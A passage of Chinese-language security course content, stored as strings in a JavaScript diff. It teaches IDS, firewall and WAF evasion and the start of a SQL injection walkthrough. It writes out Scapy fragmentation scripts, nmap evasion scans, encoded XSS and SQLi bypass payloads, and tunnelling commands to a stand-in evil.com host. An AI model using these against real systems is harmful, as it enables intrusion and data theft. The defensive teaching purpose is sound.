\"GET /../../etc/passwd HTTP/1.1\"  → 攻击成功!\r\n</code></pre></div>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 使用 Nmap 进行分片扫描:\r\nnmap -f -sS target.com        # -f: 将包分成 8 字节的小片段\r\nnmap --mtu 16 -sS target.com  # 自定义 MTU (必须是 8 的倍数)\r\n\r\n# 使用 Scapy 手动构造分片包:\r\npython -c \"\r\nfrom scapy.all import *\r\n# 构造一个包含攻击特征的包\r\npkt = IP(dst='target.com')/TCP(dport=80)/Raw(load='GET /../../etc/passwd HTTP/1.1\\r\\n')\r\n# 分片并发送\r\nfrags = fragment(pkt, fragsize=8)\r\nfor f in frags:\r\n    send(f)\r\n\"\r\n\r\n# 使用 hping3:\r\nhping3 -S -f --mtu 8 -p 80 target.com\r\n</code></pre></div>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">防御者注意</div><p>防御分片绕过的方法是在 IDS/防火墙层面进行<strong>分片重组</strong>——先组装出完整的 IP 包，再做签名匹配。但注意：IDS 和目标服务器的重组策略可能不同（如 BSD vs Linux 的 TTL 处理差异），攻击者可以利用这种差异来实施<strong>IDS 逃避</strong>。</p></div>\r\n\r\n<h2>绕过技术二：TCP 分段 (Segmentation)</h2>\r\n\r\n<p>与 IP 分片类似，但工作在 TCP 层面——把一个 TCP 段的数据拆成多个小的 TCP 段：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  原始 TCP 段:\r\n  ┌─────────────────────────────────────────────┐\r\n  │ TCP Payload:                                │\r\n  │ \"GET /admin?cmd=cat /etc/shadow HTTP/1.1\"   │\r\n  └─────────────────────────────────────────────┘\r\n  IDS 签名: \"/etc/shadow\" → 匹配! 拦截!\r\n\r\n  TCP 分段后 (MSS 设得很小):\r\n  ┌──────────────────┐\r\n  │ Segment 1 (MSS=4):│\r\n  │ \"GET \"            │\r\n  └──────────────────┘\r\n  ┌──────────────────┐\r\n  │ Segment 2 (MSS=4):│\r\n  │ \"/adm\"            │\r\n  └──────────────────┘\r\n  ┌──────────────────┐\r\n  │ Segment 3 (MSS=4):│\r\n  │ \"in?c\"            │\r\n  └──────────────────┘\r\n  ... (每个段只有 4 字节，签名被拆散)\r\n\r\n  Nmap 使用 TCP 分段:\r\n  nmap -sS --data-length 4 target.com\r\n  # --data-length: 附加随机数据，改变包的结构\r\n\r\n  Nmap 的 -g 选项 (指定源端口):\r\n  nmap -g 53 -sS target.com\r\n  # 伪装成 DNS 流量 (源端口 53)\r\n</code></pre></div>\r\n\r\n<h2>绕过技术三：编码与混淆</h2>\r\n\r\n<p>许多 IDS 只对原始字节进行签名匹配。如果攻击载荷被编码，IDS 可能就识别不出来了：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  原始攻击载荷:\r\n  GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1\r\n\r\n  URL 编码:\r\n  GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1\r\n\r\n  双重 URL 编码:\r\n  GET /search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E HTTP/1.1\r\n\r\n  Unicode 编码:\r\n  GET /search?q=\\u003cscript\\u003ealert(1)\\u003c/script\\u003e HTTP/1.1\r\n\r\n  HTML 实体编码:\r\n  GET /search?q=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; HTTP/1.1\r\n\r\n  混合大小写 + 编码:\r\n  GET /search?q=%3CsCrIpT%3Ealert(1)%3C/sCrIpT%3E HTTP/1.1\r\n\r\n  对于每种编码，IDS 是否能解码后再匹配？\r\n  如果不能 → 绕过成功\r\n  如果能 → 需要多层编码或其他方法\r\n</code></pre></div>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  SQL 注入绕过编码示例:\r\n\r\n  原始: ' OR 1=1 --\r\n  URL编码: '%20OR%201%3D1%20--\r\n  双重编码: '%2520OR%25201%253D1%2520--\r\n  Unicode: '\\u0020OR\\u00201\\u003D1\\u0020--\r\n  十六进制: 0x27204f5220313d31202d2d\r\n  大小写混合: ' oR 1=1 --\r\n  注释混淆: '/**/OR/**/1=1/**/--\r\n  等价替换: ' OR 'a'='a\r\n  数值替换: ' OR 1=1 → ' OR 2-1=1 → ' OR char(49)=char(49)\r\n</code></pre></div>\r\n\r\n<h2>绕过技术四：协议隧道</h2>\r\n\r\n<p>如果防火墙只允许特定协议通过（如 HTTP/HTTPS、DNS），攻击者可以把攻击流量封装在允许的协议中：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  HTTP 隧道 (HTTP Tunneling):\r\n  ┌─────────────────────────────────────────────────────────┐\r\n  │ 正常 HTTP 请求:                                         │\r\n  │                                                         │\r\n  │ CONNECT proxy.company.com:443 HTTP/1.1                  │\r\n  │ Host: proxy.company.com                                 │\r\n  │                                                         │\r\n  │ 隧道建立后，所有流量都在 HTTP CONNECT 通道内:           │\r\n  │ [SSH 流量]  ← 被封装在 HTTPS 中!                        │\r\n  │ [C2 通信]   ← 被封装在 HTTPS 中!                        │\r\n  │ [数据窃取]  ← 被封装在 HTTPS 中!                        │\r\n  └─────────────────────────────────────────────────────────┘\r\n\r\n  DNS 隧道 (DNS Tunneling):\r\n  数据通过 DNS 查询的子域名传输:\r\n  Q: aGVsbG8gd29ybGQ.evil.com   → Base64(\"hello world\")\r\n  A: TXT \"Y29tbWFuZDpwd2Q=\"     → Base64(\"command:pwd\")\r\n\r\n  ICMP 隧道:\r\n  数据通过 ping 包的数据部分传输:\r\n  ping -p 414243444546 -c 1 target   → 数据: \"ABCDEF\"\r\n</code></pre></div>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 常用隧道工具:\r\n\r\n# 1. HTTP 隧道 (chisel):\r\n# 服务端:\r\nchisel server -p 8080 --reverse\r\n# 客户端:\r\nchisel client http://firewall:8080 R:socks\r\n\r\n# 2. DNS 隧道 (iodine):\r\n# 服务端:\r\niodined -f -P password 10.0.0.1 tunnel.evil.com\r\n# 客户端:\r\niodine -f -P password tunnel.evil.com\r\n\r\n# 3. ICMP 隧道 (ptunnel):\r\n# 服务端:\r\nptunnel -c eth0\r\n# 客户端:\r\nptunnel -p target.com -lp 8080 -da 10.0.0.5 -dp 22\r\n\r\n# 4. SSH over HTTPS:\r\nssh -o ProxyCommand=\"corkscrew proxy 443 %h %p\" user@target\r\n</code></pre></div>\r\n\r\n<h2>绕过技术五：时间与速率规避</h2>\r\n\r\n<p>许多 IDS 使用速率检测来识别端口扫描和暴力破解。通过降低攻击速率，可以绕过这些检测：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# Nmap 的慢速扫描 (规避速率检测):\r\nnmap -sS -T1 --scan-delay 5s target.com\r\n# -T1: 慢速时序\r\n# --scan-delay 5s: 每个探测间隔 5 秒\r\n\r\n# 更隐蔽的扫描:\r\nnmap -sS -T0 --max-retries 0 --scan-delay 30s \\\r\n  --randomize-hosts -D RND:10 target.com\r\n# -T0: 最慢时序 (偏执模式)\r\n# --randomize-hosts: 随机化目标顺序\r\n# -D RND:10: 使用 10 个随机诱饵 IP\r\n\r\n# 暴力破解的慢速攻击:\r\n# 不使用每秒 1000 次的快速爆破\r\n# 而是每分钟 1 次，持续数小时/天\r\n# 大多数 IDS 的阈值是 \"5分钟内超过10次失败\"\r\n</code></pre></div>\r\n\r\n<h2>绕过技术六：利用防火墙规则的逻辑漏洞</h2>\r\n\r\n<p>防火墙规则并不总是完美的。以下是一些常见的规则逻辑漏洞：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  漏洞1: 源端口信任\r\n  ┌──────────────────────────────────────────────────────────┐\r\n  │ 防火墙规则:                                               │\r\n  │ ALLOW tcp src_port=53 any -&gt; any                          │\r\n  │ (允许 DNS 响应进入)                                       │\r\n  │                                                          │\r\n  │ 绕过: 攻击者设置源端口为 53 来发送任意数据               │\r\n  │ nmap -g 53 -sS target                                    │\r\n  └──────────────────────────────────────────────────────────┘\r\n\r\n  漏洞2: 规则顺序问题\r\n  ┌──────────────────────────────────────────────────────────┐\r\n  │ 防火墙规则:                                               │\r\n  │ Rule 1: ALLOW tcp any -&gt; 10.0.0.5:80                    │\r\n  │ Rule 2: DENY  tcp 192.168.1.0/24 -&gt; any                  │\r\n  │                                                          │\r\n  │ 问题: 来自 192.168.1.100 的请求匹配 Rule 1 就被放行了    │\r\n  │ Rule 2 永远不会被执行到 (因为 Rule 1 先匹配)             │\r\n  └──────────────────────────────────────────────────────────┘\r\n\r\n  漏洞3: 隐式允许\r\n  ┌──────────────────────────────────────────────────────────┐\r\n  │ 防火墙规则:                                               │\r\n  │ DENY tcp any -&gt; any:22 (阻止 SSH)                        │\r\n  │ ALLOW tcp any -&gt; any:80,443 (允许 HTTP/HTTPS)            │\r\n  │ (没有默认拒绝规则!)                                       │\r\n  │                                                          │\r\n  │ 绕过: SSH 服务运行在 443 端口上                           │\r\n  │ ssh -p 443 target.com                                    │\r\n  │ 防火墙看到目标端口是 443 → 放行!                          │\r\n  └──────────────────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<h2>绕过技术七：WAF 绕过技巧</h2>\r\n\r\n<p>WAF（Web 应用防火墙）是最难绕过的防线之一，但也有许多技巧：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  1. HTTP 参数污染 (HPP):\r\n     /search?id=1&amp;id=UNION SELECT\r\n     WAF 只检查第一个 id 参数 (1)\r\n     后端使用最后一个 id 参数 (UNION SELECT)\r\n\r\n  2. 分块传输编码 (Chunked Transfer):\r\n     Transfer-Encoding: chunked\r\n     3\\r\\n\r\n     UNI\\r\\n\r\n     4\\r\\n\r\n     ON S\\r\\n\r\n     5\\r\\n\r\n     ELECT\\r\\n\r\n     0\\r\\n\r\n     WAF 看到分块的片段，无法识别 \"UNION SELECT\"\r\n\r\n  3. Content-Type 混淆:\r\n     Content-Type: multipart/form-data; boundary=x\r\n     --x\r\n     Content-Disposition: form-data; name=\"q\"\r\n\r\n     ' OR 1=1 --\r\n     --x--\r\n     WAF 可能不解析 multipart 表单\r\n\r\n  4. HTTP 方法切换:\r\n     某些 WAF 只检查 GET 和 POST\r\n     改用 PUT 或 PATCH 可能绕过\r\n\r\n  5. 特殊字符:\r\n     ' OR 1=1          ← WAF 拦截\r\n     %27 OR 1=1        ← URL 编码\r\n     ' OR 1=1          ← 中间加特殊空白字符\r\n     'OR'1'='1         ← 不加空格\r\n     '\\tOR\\t1=1        ← Tab 代替空格\r\n     '%0aOR%0a1=1      ← 换行符\r\n</code></pre></div>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">攻击者视角</div><p>WAF 绕过是一门\"艺术\"。工具如 <code>wafw00f</code> 可以识别 WAF 类型，<code>WAFNinja</code> 和 <code>SQLMap --tamper</code> 提供大量绕过 payload。但记住：绕过 WAF 只是第一步，你还需要确认漏洞确实存在。</p></div>\r\n\r\n<h2>防御者的对策</h2>\r\n\r\n<p>了解了攻击者的绕过手法，防御者应该如何应对？</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  ┌──────────────────────┬─────────────────────────────────────────┐\r\n  │ 攻击手法             │ 防御对策                                │\r\n  ├──────────────────────┼─────────────────────────────────────────┤\r\n  │ IP 分片              │ 启用分片重组后再检测                    │\r\n  │                      │ 设置重组超时和最大分片数                │\r\n  ├──────────────────────┼─────────────────────────────────────────┤\r\n  │ TCP 分段             │ 流重组 (Stream Reassembly)              │\r\n  │                      │ 缓冲区大小设置合理                      │\r\n  ├──────────────────────┼─────────────────────────────────────────┤\r\n  │ 编码绕过             │ 多层解码后再匹配                        │\r\n  │                      │ 规范化 (Normalization) 处理             │\r\n  ├──────────────────────┼─────────────────────────────────────────┤\r\n  │ 协议隧道             │ 深度包检测 (DPI)                        │\r\n  │                      │ 应用层协议识别                          │\r\n  │                      │ 流量行为分析                            │\r\n  ├──────────────────────┼─────────────────────────────────────────┤\r\n  │ 慢速攻击             │ 基于行为而非速率的检测                  │\r\n  │                      │ 长周期统计分析                          │\r\n  │                      │ 机器学习模型                            │\r\n  ├──────────────────────┼─────────────────────────────────────────┤\r\n  │ 源端口伪装           │ 使用状态检测而非端口白名单              │\r\n  │                      │ 验证连接的完整性                        │\r\n  ├──────────────────────┼─────────────────────────────────────────┤\r\n  │ WAF 绕过             │ 多层防御 (WAF + IDS + 应用层验证)      │\r\n  │                      │ 定期更新 WAF 规则                       │\r\n  │                      │ 输入验证不依赖 WAF                      │\r\n  └──────────────────────┴─────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<h2>动手实验：构建 IDS 逃避测试</h2>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 实验环境:\r\n# 攻击机: Kali Linux (192.168.56.10)\r\n# 目标机: 运行 Snort IDS (192.168.56.20)\r\n\r\n# 1. 普通扫描 (会被 IDS 检测):\r\nnmap -sS 192.168.56.20\r\n# 查看 Snort 日志: tail -f /var/log/snort/alert\r\n\r\n# 2. 分片扫描 (可能绕过简单 IDS):\r\nnmap -f -sS 192.168.56.20\r\n\r\n# 3. 使用诱饵 IP:\r\nnmap -sS -D 10.0.0.1,10.0.0.2,10.0.0.3,ME 192.168.56.20\r\n\r\n# 4. 使用 Scapy 构造自定义分片包:\r\npython3 -c \"\r\nfrom scapy.all import *\r\ntarget = '192.168.56.20'\r\n\r\n# 构造包含攻击特征的 HTTP 请求\r\npayload = 'GET /../../etc/passwd HTTP/1.1\\r\\nHost: target\\r\\n\\r\\n'\r\n\r\n# 正常发送 (会被 IDS 拦截)\r\n# send(IP(dst=target)/TCP(dport=80)/Raw(load=payload))\r\n\r\n# 分片发送 (可能绕过 IDS)\r\npkt = IP(dst=target)/TCP(dport=80, flags='PA')/Raw(load=payload)\r\nfrags = fragment(pkt, fragsize=16)\r\nfor f in frags:\r\n    send(f)\r\n    import time; time.sleep(0.5)  # 慢速发送\r\n\"\r\n\r\n# 5. 对比 IDS 日志:\r\n#    步骤 1 应该触发大量告警\r\n#    步骤 2-4 的告警数量应该减少\r\n</code></pre></div>\r\n\r\n<h2>防火墙策略审计</h2>\r\n\r\n<p>作为防御者，定期审计防火墙规则是非常重要的：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 查看 iptables 规则 (Linux):\r\niptables -L -n -v --line-numbers\r\n\r\n# 查看防火墙规则 (Windows):\r\nnetsh advfirewall firewall show rule name=all dir=in\r\n\r\n# 常见审计检查点:\r\n# 1. 是否有默认拒绝规则 (最后的 DROP ALL)?\r\n# 2. 是否有过于宽泛的允许规则 (any -&gt; any)?\r\n# 3. 规则顺序是否正确 (先拒绝后允许)?\r\n# 4. 是否有不必要的开放端口?\r\n# 5. 是否记录了被拒绝的连接?\r\n\r\n# 使用 nmap 从外部审计防火墙:\r\nnmap -sA target.com    # ACK 扫描: 判断端口是否被过滤\r\nnmap -sN target.com    # NULL 扫描: 所有 flag 都为 0\r\nnmap -sF target.com    # FIN 扫描: 只有 FIN flag\r\nnmap -sW target.com    # Window 扫描: 利用 TCP Window 值\r\n\r\n# 对比内部和外部扫描结果:\r\n# 内部扫描: 所有端口可见\r\n# 外部扫描: 被防火墙过滤的端口不可见\r\n# 差异 = 防火墙正在过滤的端口\r\n</code></pre></div>\r\n\r\n<div class=\"callout success\"><div class=\"callout-title\">防御者总结</div><p>没有完美的防御。安全是一个持续对抗的过程。最佳实践是：<strong>纵深防御</strong>——部署多层防线（防火墙 + IDS + WAF + 应用层验证），确保即使一层被绕过，还有其他层来检测和阻止攻击。同时，持续监控、日志分析和威胁情报更新同样重要。</p></div>\r\n\r\n<h2>数据包的一生：回顾完整旅程</h2>\r\n\r\n<p>让我们回顾一下一个 HTTP 请求从诞生到到达服务器的完整旅程：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  ┌─────────────────────────────────────────────────────────────────┐\r\n  │                    数据包的一生                                  │\r\n  │                                                                 │\r\n  │ 1. [应用层] 浏览器构造 HTTP 请求                                │\r\n  │    GET / HTTP/1.1                                               │\r\n  │    Host: cyberedu.cn                                            │\r\n  │                    ↓                                            │\r\n  │ 2. [传输层] TCP 添加端口和序列号，进行三次握手                  │\r\n  │    [SYN] → [SYN,ACK] → [ACK] → 连接建立                       │\r\n  │                    ↓                                            │\r\n  │ 3. [网际层] IP 添加源/目标 IP 地址                              │\r\n  │    192.168.1.100 → 203.0.113.50                                 │\r\n  │                    ↓                                            │\r\n  │ 4. [网络接口层] Ethernet 添加 MAC 地址                          │\r\n  │    本地 MAC → 网关 MAC                                          │\r\n  │                    ↓                                            │\r\n  │ 5. [物理传输] 数据包通过网络线缆/Wi-Fi 发送                     │\r\n  │                    ↓                                            │\r\n  │ 6. [路由] 经过多个路由器，MAC 地址不断更换，TTL 递减             │\r\n  │    Router 1 → Router 2 → Router 3 → ...                        │\r\n  │                    ↓                                            │\r\n  │ 7. [安全检查] 经过防火墙和 IDS 的审查                           │\r\n  │    包过滤 → 状态检测 → 签名匹配 → 应用层分析                    │\r\n  │                    ↓                                            │\r\n  │ 8. [解封装] 服务器逐层拆除头部                                  │\r\n  │    Ethernet → IP → TCP → HTTP                                   │\r\n  │                    ↓                                            │\r\n  │ 9. [处理] 服务器处理 HTTP 请求并生成响应                        │\r\n  │    HTTP 200 OK + HTML 内容                                      │\r\n  │                    ↓                                            │\r\n  │ 10. [返回] 响应包沿相反路径返回客户端                           │\r\n  │     服务器 → 防火墙 → 路由器 → 你的电脑                         │\r\n  │                    ↓                                            │\r\n  │ 11. [渲染] 浏览器接收响应并渲染页面                              │\r\n  │     你看到了 cyberedu.cn 的首页!                                 │\r\n  └─────────────────────────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<p>这就是一个数据包完整的一生。从你按下回车键到页面加载完成，这一切在几百毫秒内就完成了。而作为安全工程师，你需要理解这整个过程中的每一个环节——因为攻击可能发生在任何一个环节。</p>\r\n\r\n<div class=\"checkpoint\" data-cp=\"15\"></div>\r\n<div class=\"checkpoint\" data-cp=\"16\"></div>\r\n<div class=\"checkpoint\" data-cp=\"17\"></div>\r\n\r\n</section>";
+
+
+// ============================================================
+// WEB SECURITY MODULE - REWRITTEN CONTENT (Phase 3)
+// ============================================================
+
+SECTION_CONTENT["web-01-01"] = "<div class=\"section-transition\"><p>在网络模块中，我们追踪了一个 HTTP 请求从浏览器到服务器的完整旅程——TCP 握手、DNS 解析、防火墙过滤。现在进入 Web 安全模块，我们的视角从\"数据包如何传输\"转向\"应用如何被攻破\"。第一个目标：<strong>SQL 注入</strong>——让数据库执行攻击者想要的查询。</p></div>\n\n<!-- SQL 注入原理与利用 -->\n\n<h2>SQL 注入原理与利用</h2>\n\n<div class=\"callout default\">\n<div class=\"callout-title\">渗透测试实战：入侵 CyberShop 数据库</div>\n<p>在本章中，你将扮演一名渗透测试工程师，对 CyberShop 电商平台进行安全测试。你的目标是从一个普通的登录页面出发，逐步发现并利用 SQL 注入漏洞，最终理解如何从根本上防御这类攻击。</p>\n</div>\n\n<!-- ======================== 1. 场景引入 ======================== -->\n\n<h3>场景引入：CyberShop 的登录页面</h3>\n\n<p>你接到任务，对 CyberShop 的 Web 应用进行渗透测试。打开浏览器，访问目标站点，一个普通的登录页面出现在眼前：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">&lt;!-- CyberShop 登录页面 --&gt;\n&lt;form action=\"/login\" method=\"GET\"&gt;\n    &lt;input type=\"text\" name=\"user\" placeholder=\"用户名\"&gt;\n    &lt;input type=\"password\" name=\"pass\" placeholder=\"密码\"&gt;\n    &lt;button type=\"submit\"&gt;登录&lt;/button&gt;\n&lt;/form&gt;</code></pre></div>\n\n<p>你输入了一个测试账号 <code>admin / 123</code>，点击登录后，浏览器地址栏显示了如下 URL：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">https://cybershop.example.com/login?user=admin&pass=123</code></pre></div>\n\n<p>页面返回：<em>\"用户名或密码错误\"</em>。这很正常——但作为一名渗透测试者，你的直觉告诉你：</p>\n\n<ul>\n<li>表单使用 <strong>GET</strong> 方法提交，参数直接暴露在 URL 中</li>\n<li>参数名 <code>user</code> 和 <code>pass</code> 暗示后端可能直接拼接 SQL 查询</li>\n<li>如果后端没有对输入做任何过滤……你可以尝试一些\"特殊字符\"</li>\n</ul>\n\n<p>于是你在用户名字段输入一个单引号 <code>'</code>，密码随意填写，点击登录——</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">https://cybershop.example.com/login?user=admin'&pass=123</code></pre></div>\n\n<p>页面报错了：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">Error: You have an error in your SQL syntax; check the manual that corresponds\nto your MySQL server version for the right syntax to use near ''123''' at line 1</code></pre></div>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">提示</div>\n<p>这个错误信息暴露了关键线索：后端使用的是 <strong>MySQL</strong> 数据库，而且用户输入被<strong>直接拼接</strong>到了 SQL 语句中。单引号破坏了 SQL 的语法结构，导致查询失败。这正是 SQL 注入的前兆。</p>\n</div>\n\n<!-- ======================== 2. 发现漏洞：登录绕过 ======================== -->\n\n<h3>发现漏洞：登录绕过</h3>\n\n<p>既然单引号能破坏 SQL 语法，那我们能不能构造一段<strong>有意义的 SQL 片段</strong>来改变查询逻辑？</p>\n\n<p>根据错误信息和常见的登录逻辑，你可以推测后端的 SQL 查询大概是这样写的：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-sql\">SELECT * FROM users WHERE username = 'admin'' AND password = '123'</code></pre></div>\n\n<p>注意 <code>admin''</code> 处出现了两个单引号——这就是你输入的 <code>'</code> 造成的语法错误。原始的正常查询应该是：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-sql\">SELECT * FROM users WHERE username = 'admin' AND password = '123'</code></pre></div>\n\n<p>现在，你在密码字段输入以下 payload：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-sql\">' OR '1'='1</code></pre></div>\n\n<p>用户名仍填 <code>admin</code>，提交后完整的 SQL 变成了：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-sql\">SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'</code></pre></div>\n\n<p>让我们拆解这条查询的逻辑：</p>\n\n<ol>\n<li><code>username = 'admin'</code> — 检查用户名是否为 admin</li>\n<li><code>password = ''</code> — 检查密码是否为空字符串（当然不是）</li>\n<li><code>OR '1'='1'</code> — <strong>但 1 永远等于 1，这个条件恒为真！</strong></li>\n</ol>\n\n<p>由于 <code>OR</code> 的存在，只要<em>任何一侧</em>为真，整个 WHERE 条件就为真。而 <code>'1'='1'</code> 永远为真，因此数据库会返回 <code>users</code> 表中的<strong>所有记录</strong>。后端代码看到查询返回了结果，便认为登录成功。</p>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">注意</div>\n<p>实际上更常见的 payload 是 <code>' OR 1=1 --</code>，其中 <code>--</code> 是 SQL 的单行注释符，它会注释掉后面多余的引号和条件，使语句更\"干净\"：</p>\n</div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-sql\">-- 密码字段输入: ' OR 1=1 --\nSELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1 --'</code></pre></div>\n\n<p>末尾的 <code>--</code> 将最后一个多余的单引号 <code>'</code> 注释掉了，避免了语法错误。</p>\n\n<div class=\"callout success\">\n<div class=\"callout-title\">攻击成功</div>\n<p>页面显示：<em>\"欢迎回来，admin！\"</em> — 你没有使用任何有效密码，却成功登录了管理员账户。这就是经典的 <strong>SQL 注入身份验证绕过</strong>。</p>\n</div>\n\n<!-- ======================== CHECKPOINT 0 ======================== -->\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<!-- ======================== 3. 深入理解：SQL 注入的原理 ======================== -->\n\n<h3>深入理解：SQL 注入的原理</h3>\n\n<p>SQL 注入的本质是什么？一句话概括：</p>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">核心概念</div>\n<p><strong>用户输入被当作代码执行。</strong>当应用程序将用户输入直接拼接到 SQL 语句中，攻击者就可以注入任意 SQL 代码，改变查询的原始逻辑。</p>\n</div>\n\n<p>让我们看看有漏洞的代码和安全的代码之间的区别：</p>\n\n<h4>危险写法：字符串拼接（Python + MySQL）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># ❌ 危险：直接拼接用户输入\ndef login(username, password):\n    query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"\n    cursor.execute(query)\n    return cursor.fetchone()\n\n# 当 username = \"admin\", password = \"' OR 1=1 --\"\n# 生成的 SQL:\n# SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1 --'</code></pre></div>\n\n<h4>安全写法：参数化查询（Python + MySQL）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># ✅ 安全：使用参数化查询\ndef login(username, password):\n    query = \"SELECT * FROM users WHERE username = %s AND password = %s\"\n    cursor.execute(query, (username, password))\n    return cursor.fetchone()\n\n# 无论用户输入什么，数据库都会将其视为纯数据（字符串值），\n# 而不会解释为 SQL 代码的一部分</code></pre></div>\n\n<p>关键区别在于：参数化查询中，SQL 语句的<strong>结构</strong>和用户提供的<strong>数据</strong>是分开传递的。数据库引擎会先解析 SQL 语句的结构，然后再将参数值填入——用户输入永远不可能改变 SQL 的逻辑。</p>\n\n<h4>可视化对比</h4>\n\n<p>假设用户输入的密码是 <code>' OR 1=1 --</code>：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">【字符串拼接 — 输入变成了代码的一部分】\n\nSQL 模板:  SELECT * FROM users WHERE password = '[INPUT]'\n用户输入:  ' OR 1=1 --\n最终 SQL:  SELECT * FROM users WHERE password = '' OR 1=1 --'\n                                       ↑ 输入打破了引号边界\n                                         改变了 WHERE 条件逻辑\n\n【参数化查询 — 输入始终只是数据】\n\nSQL 模板:  SELECT * FROM users WHERE password = ?\n用户输入:  ' OR 1=1 --\n数据库理解: 查找 password 列的值 恰好等于 字符串 \"' OR 1=1 --\" 的行\n           （当然找不到，因为没有用户的密码真的叫这个名字）</code></pre></div>\n\n<!-- ======================== 4. 攻击升级：数据窃取 ======================== -->\n\n<h3>攻击升级：从登录绕过到数据窃取</h3>\n\n<p>登录绕过只是 SQL 注入的冰山一角。更危险的是，攻击者可以利用注入漏洞<strong>读取数据库中的任意数据</strong>——用户密码、信用卡号、个人信息……</p>\n\n<p>CyberShop 有一个商品搜索页面：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">https://cybershop.example.com/search?q=手机</code></pre></div>\n\n<p>页面显示了搜索结果：商品名称、价格、描述。你猜测后端查询类似：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-sql\">SELECT name, price, description FROM products WHERE name LIKE '%手机%'</code></pre></div>\n\n<p>如果 <code>q</code> 参数存在注入，你可以使用 <strong>UNION 注入</strong>来窃取其他表的数据。</p>\n\n<h4>第一步：确定列数</h4>\n\n<p>UNION 要求前后两个 SELECT 的列数一致。你需要先猜出原始查询有几列。使用 <code>ORDER BY</code> 逐步试探：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 在搜索框依次尝试：\n手机' ORDER BY 1 --     ✅ 正常\n手机' ORDER BY 2 --     ✅ 正常\n手机' ORDER BY 3 --     ✅ 正常\n手机' ORDER BY 4 --     ❌ 报错：Unknown column '4'\n\n# 结论：原始查询有 3 列</code></pre></div>\n\n<h4>第二步：确定回显位</h4>\n\n<p>你需要知道哪一列的内容会显示在页面上（\"回显列\"）。使用 UNION SELECT 填充占位符：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 搜索框输入：\n' UNION SELECT 1, 2, 3 --\n\n# 页面上出现了数字 \"1\" 和 \"2\"，说明第 1 列和第 2 列会回显\n# 第 3 列没有显示</code></pre></div>\n\n<h4>第三步：提取数据库信息</h4>\n\n<p>现在你在回显列的位置放入想要查询的内容：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-sql\">-- 获取数据库版本\n' UNION SELECT version(), user(), 3 --\n-- 页面显示: 8.0.32 和 root@localhost\n\n-- 获取所有数据库名\n' UNION SELECT group_concat(schema_name), 2, 3 FROM information_schema.schemata --\n-- 页面显示: information_schema,cybershop,wordpress\n\n-- 获取 cybershop 数据库的所有表名\n' UNION SELECT group_concat(table_name), 2, 3\n  FROM information_schema.tables\n  WHERE table_schema = 'cybershop' --\n-- 页面显示: users,products,orders,payments</code></pre></div>\n\n<h4>第四步：窃取用户数据</h4>\n\n<p>目标锁定 <code>users</code> 表。先获取列名：</p>\n\n<div class=\"code-block\"><div 